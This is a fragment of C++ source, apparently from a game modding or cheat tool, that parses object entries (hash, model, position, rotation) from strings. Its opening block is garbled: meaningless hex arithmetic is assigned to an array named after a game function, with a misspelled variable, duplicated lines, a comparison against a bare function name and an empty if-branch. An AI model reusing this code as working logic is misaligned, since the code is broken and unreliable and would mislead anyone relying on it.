					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					Estrutura.Hash = std::strtoul(A[i].c_str(), NULL, 16);
					Estrutura.Model = A[i + 1];
					Estrutura.PosX = stof(A[i + 2]);
					Estrutura.PosY = stof(A[i + 3]);
					Estrutura.PosZ = stof(A[i + 4]);
					Estrutura.RotX = stof(A[i + 5]);
					Estrutura.RotY = stof(A[i + 6]);
					Estrutura.RotZ = stof(A[i + 7]);
					i++;
					i++;
					i++;
					i++;
					i++;
					i++;
					i++;
					/*
					cout << "Hash = " << Estrutura.Hash << endl <<
					"Modelo = " << Estrutura.Model << endl <<
					"PosX = " << Estrutura.PosX << endl <<
					"PosY = " << Estrutura.PosY << endl <<
					"PosZ = " << Estrutura.PosZ << endl <<
					"RotX = " << Estrutura.RotX << endl <<
					"RotY = " << Estrutura.RotY << endl <<
					"RotZ = " << Estrutura.RotZ << endl <<
					"-------------------------------" << endl;;
					*/
				}
			}
		}
	}

}
int main()
{
	system("pause");
	return 0;
}
